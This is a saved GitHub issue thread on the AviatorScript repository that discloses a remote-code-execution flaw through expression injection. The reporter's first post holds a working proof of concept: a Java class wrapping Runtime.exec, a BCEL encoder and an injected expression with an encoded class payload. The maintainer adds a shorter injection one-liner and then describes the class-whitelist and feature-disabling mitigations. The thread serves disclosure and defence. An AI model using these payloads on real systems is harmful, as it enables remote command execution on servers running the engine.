=== Content from github.com_551d0b27_20250114_231825.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fkillme2008%2Faviatorscript%2Fissues%2F421)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fkillme2008%2Faviatorscript%2Fissues%2F421)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=killme2008%2Faviatorscript)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[killme2008](/killme2008)
/
**[aviatorscript](/killme2008/aviatorscript)**
Public

* [Notifications](/login?return_to=%2Fkillme2008%2Faviatorscript) You must be signed in to change notification settings
* [Fork
  863](/login?return_to=%2Fkillme2008%2Faviatorscript)
* [Star
   4.7k](/login?return_to=%2Fkillme2008%2Faviatorscript)

* [Code](/killme2008/aviatorscript)
* [Issues
  55](/killme2008/aviatorscript/issues)
* [Pull requests
  5](/killme2008/aviatorscript/pulls)
* [Actions](/killme2008/aviatorscript/actions)
* [Projects
  0](/killme2008/aviatorscript/projects)
* [Wiki](/killme2008/aviatorscript/wiki)
* [Security](/killme2008/aviatorscript/security)
* [Insights](/killme2008/aviatorscript/pulse)

Additional navigation options

* [Code](/killme2008/aviatorscript)
* [Issues](/killme2008/aviatorscript/issues)
* [Pull requests](/killme2008/aviatorscript/pulls)
* [Actions](/killme2008/aviatorscript/actions)
* [Projects](/killme2008/aviatorscript/projects)
* [Wiki](/killme2008/aviatorscript/wiki)
* [Security](/killme2008/aviatorscript/security)
* [Insights](/killme2008/aviatorscript/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fkillme2008%2Faviatorscript%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fkillme2008%2Faviatorscript%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# There is a critical expression injection RCE vulnerability in this expression engine（该表达式引擎存在表达式注入漏洞） #421

Closed

[yuligesec](/yuligesec) opened this issue
Sep 30, 2021
· 9 comments

Closed

# [There is a critical expression injection RCE vulnerability in this expression engine（该表达式引擎存在表达式注入漏洞）](#top) #421

[yuligesec](/yuligesec) opened this issue
Sep 30, 2021
· 9 comments

## Comments

[![@yuligesec](https://avatars.githubusercontent.com/u/32768214?s=80&u=5ca45c8e2e7711caf5c7f0eb40ef2e2f08841c0d&v=4)](/yuligesec)

Copy link

### **[yuligesec](/yuligesec)** commented [Sep 30, 2021](#issue-1011934162)

| The new object can be directly entered when entering the aviator expression, but it is not allowed to call non-public static methods. You can use the BCELClassloader to load the BCEL code to complete the RCE. First prepare a malicious evil.class. Set the public static method exec to execute arbitrary commands. （输入aviator表达式时可以直接new对象，但是不允许调用非public static的方法。可以使用BCELClassloader加载BCEL编码的形式完成RCE。 首先准备一个恶意的evil.class。设置public static方法exec来执行任意命令。）  ``` import java.io.IOException; public class evil {     public static Process exec(String cmd) throws IOException {         return Runtime.getRuntime().exec(cmd);     } } ```  Then encode it in BCEL. （然后将其BCEL编码。）  ``` import com.sun.org.apache.bcel.internal.classfile.Utility; import java.nio.file.Files; import java.nio.file.Path; import java.nio.file.Paths; public class BCELencode {     public static void main(String []args) throws Exception{         Path path = Paths.get("evil.class");         byte[] data = Files.readAllBytes(path);         String s =  Utility.encode(data,true);         System.out.print("$$BCEL$$"+s);     } } ```  Prepare the vulnerability environment. Use the latest version of aviatorscript. （准备漏洞环境。使用最新版的aviatorscript。）  ``` <dependencies>     <dependency>         <groupId>com.googlecode.aviator</groupId>         <artifactId>aviator</artifactId>         <version>5.3.0-beta</version>     </dependency> </dependencies>  ```  Perform aviator expression injection. （进行aviator表达式注入。）  ``` import com.googlecode.aviator.AviatorEvaluator; import com.googlecode.aviator.AviatorEvaluatorInstance; public class test {     public static void main(String[] args) {         AviatorEvaluatorInstance evaluator = AviatorEvaluator.newInstance();         evaluator.execute("'a'+(c=Class.forName(\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3dCK$5bk$95$97$f8$7e$c4$95$c0$c2$s$c6$j$c6$NjbR$c5$88a_$ca$E$86$40k$da$c1$f0Y$baQ$e3$c2$P$f0$a3$8cw$w$B$a2M$e6$de9$e7$9es$e6$a6_$df$l$9f$ANq$60$p$8b$b2$8dul$a8$b2ib$cb$c46$83q$sB$n$cf$Z$b4J$b5$cd$a07$a2$$g$c8y$o$e4$b7$e3Q$87$c7$P$7egHL$d1$8b$C$7f$d8$f6c$a1$f0$94$d4e_$q$MY$afqsQ$t$c8$t$3c$608$aax$D$ff$c9w$87$7e$d8s$5b2$Wa$af$5e$5d$a0$ee$e2$u$e0IB$G$z$YuU$f4$3f9$83$7d9$J$f8$a3$UQ$98$98$d8$n$dc$8a$c6q$c0$af$84z$d7$a2$f7$8e$95$c9$81$B$d3$c4$ae$83$3d$ec$3bX$c1$w$85$d2$90$n$3f$cflv$G$3c$90$M$a5$94$S$91$7b$dd$9c$853$U$e6$c2$fbq$u$c5$88$f2$ed$k$973P$ae$y$$$3f$a5$eb8$84N$7fT$7d$Z0$b5$GU$8b$90K$9dQ$cf$d6$de$c0$5e$d2$f1$SU$p$r5$d8T$9d_$B$96$e9$G$9a$d2$da$a4R$e6$934$M$b0$de$91$a9$bdB$7b$fe$e37$W$fc$Wr$c8S$_$d0$d1$89$v$d2$v$a5$fa$b5$l$d5$l$f2$9c$f6$B$A$A\",true,new com.sun.org.apache.bcel.internal.util.ClassLoader()) ) + ( c.exec(\"open /System/Applications/Calculator.app\") );");     }   } ```  The command was executed successfully. （成功执行命令。） [Calc](https://user-images.githubusercontent.com/32768214/135420784-fc4ef065-15de-401a-aeb1-697fc853d0eb.png) |
| --- |
| The text was updated successfully, but these errors were encountered: |

 👍
3
 LinoBarreca, maniacs1, and tyskill reacted with thumbs up emoji

All reactions

* 👍
  3 reactions

[![@meta-sec](https://avatars.githubusercontent.com/u/33144048?s=80&u=489e145935e5dc5e5248cf2698b66b92d2474052&v=4)](/meta-sec)

Copy link

### **[meta-sec](/meta-sec)** commented [Oct 4, 2021](#issuecomment-933222720)

| 牛逼 |
| --- |

All reactions

Sorry, something went wrong.

[![@LinoBarreca](https://avatars.githubusercontent.com/u/897723?s=80&u=2422342209827814bac3a7504cd8c82c89002d8e&v=4)](/LinoBarreca)

Copy link

### **[LinoBarreca](/LinoBarreca)** commented [Oct 4, 2021](#issuecomment-933335733)

| Nice discovery |
| --- |

All reactions

Sorry, something went wrong.

[![@killme2008](https://avatars.githubusercontent.com/u/14142?s=80&u=3672dccbda1ce19f39368dabd440e236f0a10b1c&v=4)](/killme2008)

Copy link

Owner

### **[killme2008](/killme2008)** commented [Oct 5, 2021](#issuecomment-934446563) • edited Loading

| 你有更简单的办法来注入了，既然是全功能的脚本模式，几乎所有的 java api 都可以调用。比如上述注入可以简单修改为：  ```     AviatorEvaluatorInstance evaluator = AviatorEvaluator.newInstance();     evaluator.setFunctionMissing(JavaMethodReflectionFunctionMissing.getInstance());     evaluator.execute("exec(Runtime.getRuntime(), 'open /System/Applications/Calculator.app')"); ```  不建议直接暴露 aviatorscript 脚本执行在公网环境。 |
| --- |

 👍
4
 jas502n, f1ynn-zhan9, iseki0, and greatyy reacted with thumbs up emoji

All reactions

* 👍
  4 reactions

Sorry, something went wrong.

[![@killme2008](https://avatars.githubusercontent.com/u/14142?s=40&u=3672dccbda1ce19f39368dabd440e236f0a10b1c&v=4)](/killme2008)
[killme2008](/killme2008)
closed this as [completed](/killme2008/aviatorscript/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Oct 5, 2021](#event-5411052635)

[![@killme2008](https://avatars.githubusercontent.com/u/14142?s=80&u=3672dccbda1ce19f39368dabd440e236f0a10b1c&v=4)](/killme2008)

Copy link

Owner

### **[killme2008](/killme2008)** commented [Oct 5, 2021](#issuecomment-934449571) • edited Loading

| 如果需要控制可以访问的 class 白名单，可以通过 `Options.ALLOWED_CLASS_SET` 选项，仅限白名单内的 class 可以被 new 或者使用静态变量及方法。  更多安全选项参考 <https://www.yuque.com/boyan-avfmj/aviatorscript/ou23gy#elOSu> |
| --- |

All reactions

Sorry, something went wrong.

[![@killme2008](https://avatars.githubusercontent.com/u/14142?s=80&u=3672dccbda1ce19f39368dabd440e236f0a10b1c&v=4)](/killme2008)

Copy link

Owner

### **[killme2008](/killme2008)** commented [Oct 5, 2021](#issuecomment-934462748)

| 比如上述例子，在设置禁止（白名单为空）任何静态字段或者静态方法调用后，将调用失败：  ```  AviatorEvaluatorInstance evaluator = AviatorEvaluator.newInstance();     evaluator.setOption(Options.ALLOWED_CLASS_SET, Collections.emptySet());      ```  ``` Exception in thread "main" com.googlecode.aviator.exception.ExpressionRuntimeException: `class com.sun.org.apache.bcel.internal.util.ClassLoader` is not in allowed class set, check Options.ALLOWED_CLASS_SET 	at com.googlecode.aviator.utils.Env.checkIfClassIsAllowed(Env.java:220) 	at com.googlecode.aviator.utils.Env.resolveClassSymbol(Env.java:177) 	at com.googlecode.aviator.utils.Env.resolveClassSymbol(Env.java:168) 	at com.googlecode.aviator.runtime.function.internal.NewInstanceFunction.variadicCall(NewInstanceFunction.java:48) 	at com.googlecode.aviator.runtime.function.AbstractVariadicFunction.call(AbstractVariadicFunction.java:64) 	at Script_1633443720826_58/1921595561.execute0(Script_1633443720826_58:1) 	at com.googlecode.aviator.ClassExpression.executeDirectly(ClassExpression.java:44) 	at com.googlecode.aviator.BaseExpression.execute(BaseExpression.java:237) 	at com.googlecode.aviator.AviatorEvaluatorInstance.execute(AviatorEvaluatorInstance.java:1639) 	at com.googlecode.aviator.AviatorEvaluatorInstance.execute(AviatorEvaluatorInstance.java:1654) 	at com.googlecode.aviator.AviatorEvaluatorInstance.execute(AviatorEvaluatorInstance.java:1690)  ```  更多安全选项可以参考  <https://www.yuque.com/boyan-avfmj/aviatorscript/ou23gy#elOSu>  不过这些选项也仅限我能想到的，可能还存在别的隐患，从我的角度，不推荐直接将脚本的执行（不仅是 aviatorscript 了，几乎任何可运行脚本的开放都应该慎重）开放到任何不可信的环境，如果确实需要，可以参考上述文档设置必要的选项，其次是这样的 API 或者接口都应该做严格的鉴权。 |
| --- |

 👍
2
 Soontao and akuma reacted with thumbs up emoji

All reactions

* 👍
  2 reactions

Sorry, something went wrong.

[![@killme2008](https://avatars.githubusercontent.com/u/14142?s=80&u=3672dccbda1ce19f39368dabd440e236f0a10b1c&v=4)](/killme2008)

Copy link

Owner

### **[killme2008](/killme2008)** commented [Oct 8, 2021](#issuecomment-938299134) • edited Loading

| AviatorScript is just a script language(engine), and if you export an API or something else to execute a script by users publicly, you must count on yourself to ensure security.  But AviatorScript provides some security options <https://www.yuque.com/boyan-avfmj/aviatorscript/ou23gy#elOSu>. In this case, you can   * disable `new` syntax feature by `evaluator.disableFeature(Feature.NewInstance)`. * or set `Opitons. ALLOWED_CLASS_SET` (For example, disable all classes `evaluator.setOption(Options.ALLOWED_CLASS_SET, Collections.emptySet());`) value to set a white list for classes.   My suggestion is that please use a script engine in internal and trustable environment, if you can't , you must protected the API or interface by authorization and try to set some security options. Thank you. |
| --- |

 👍
2
 Soontao and iseki0 reacted with thumbs up emoji
 👀
2
 Soontao and killme2008 reacted with eyes emoji

All reactions

* 👍
  2 reactions
* 👀
  2 reactions

Sorry, something went wrong.

[![@Soontao](https://avatars.githubusercontent.com/u/10473459?s=80&u=c145f5552faedc8b838b999e57b92adac6a62579&v=4)](/Soontao)

Copy link

### **[Soontao](/Soontao)** commented [Oct 11, 2021](#issuecomment-939765143) • edited Loading

| it seems that BCEL injection is not applicable for Aviator `4.x`, the same code can not be reproduced in 4.x, and the engine will throw the parsing exception:  ``` com.googlecode.aviator.exception.ExpressionSyntaxErrorException: Syntax error:insert ')' to complete Expression at 824, current token: [type='variable',lexeme='new',index=824]. Parsing expression: `'a'+(c=Class.forName("$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3dCK$5bk$95$97$f8$7e$c4$95$c0$c2$s$c6$j$c6$NjbR$c5$88a_$ca$E$86$40k$da$c1$f0Y$baQ$e3$c2$P$f0$a3$8cw$w$B$a2M$e6$de9$e7$9es$e6$a6_$df$l$9f$ANq$60$p$8b$b2$8dul$a8$b2ib$cb$c46$83q$sB$n$cf$Z$b4J$b5$cd$a07$a2$$g$c8y$o$e4$b7$e3Q$87$c7$P$7egHL$d1$8b$C$7f$d8$f6c$a1$f0$94$d4e_$q$MY$afqsQ$t$c8$t$3c$608$aax$D$ff$c9w$87$7e$d8s$5b2$Wa$af$5e$5d$a0$ee$e2$u$e0IB$G$z$YuU$f4$3f9$83$7d9$J$f8$a3$UQ$98$98$d8$n$dc$8a$c6q$c0$af$84z$d7$a2$f7$8e$95$c9$81$B$d3$c4$ae$83$3d$ec$3bX$c1$w$85$d2$90$n$3f$cflv$G$3c$90$M$a5$94$S$91$7b$dd$9c$853$U$e6$c2$fbq$u$c5$88$f2$ed$k$973P$ae$y$$$3f$a5$eb8$84N$7fT$7d$Z0$b5$GU$8b$90K$9dQ$cf$d6$de$c0$5e$d2$f1$SU$p$r5$d8T$9d_$B$96$e9$G$9a$d2$da$a4R$e6$934$M$b0$de$91$a9$bdB$7b$fe$e37$W$fc$Wr$c8S$_$d0$d1$89$v$d2$v$a5$fa$b5$l$d5$l$f2$9c$f6$B$A$A",true,new com.sun.org.apache.bcel.internal.util.ClassLoader^^`  ```  Meanwhile, from `5.0.0` to `5.2.0`, the engine will throw exception and will be safe:  ``` com.googlecode.aviator.exception.FunctionNotFoundException: Function not found: Class.forName  ```  **The BCEL only could be reproduced above the version `5.2.1` (include).** |
| --- |

 👍
1
 Soontao reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@killme2008](https://avatars.githubusercontent.com/u/14142?s=80&u=3672dccbda1ce19f39368dabd440e236f0a10b1c&v=4)](/killme2008)

Copy link

Owner

### **[killme2008](/killme2008)** commented [Oct 11, 2021](#issuecomment-939996241) • edited Loading

| [@Soontao](https://github.com/Soontao) That's because aviator 4.x and older versions is not a script language but a simple expression evaluator doesn't support new/if/for statements etc. |
| --- |

 👍
1
 Soontao reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@killme2008](https://avatars.githubusercontent.com/u/14142?s=80&u=3672dccbda1ce19f39368dabd440e236f0a10b1c&v=4)](/killme2008)

Copy link

Owner

### **[killme2008](/killme2008)** commented [Oct 11, 2021](#issuecomment-939997350)

| Please read the release note and documents. I don't want to reply this thread any more, thank you. |
| --- |

 👍
1
 Soontao reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@Acechengui](https://avatars.githubusercontent.com/u/63096199?s=40&v=4)](/Acechengui)
[Acechengui](/Acechengui)
mentioned this issue
[Jul 31, 2022](#ref-issue-1323398792)

[积木报表中的多个依赖安全漏洞
jeecgboot/JimuReport#1189](/jeecgboot/JimuReport/issues/1189)

Closed

[![@joelteo-poloniex](https://avatars.githubusercontent.com/u/111414631?s=40&v=4)](/joelteo-poloniex)
[joelteo-poloniex](/joelteo-poloniex)
mentioned this issue
[Feb 20, 2024](#ref-pullrequest-2143372947)

[[GHSA-xpv2-8ppj-79hh] Expression injection in AviatorScript
github/advisory-database#3559](/github/advisory-database/pull/3559)
 Merged

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fkillme2008%2Faviatorscript%2Fissues%2F421)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

5 participants

[![@killme2008](https://avatars.githubusercontent.com/u/14142?s=52&v=4)](/killme2008) [![@LinoBarreca](https://avatars.githubusercontent.com/u/897723?s=52&v=4)](/LinoBarreca) [![@Soontao](https://avatars.githubusercontent.com/u/10473459?s=52&v=4)](/Soontao) [![@yuligesec](https://avatars.githubusercontent.com/u/32768214?s=52&v=4)](/yuligesec) [![@meta-sec](https://avatars.githubusercontent.com/u/33144048?s=52&v=4)](/meta-sec)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


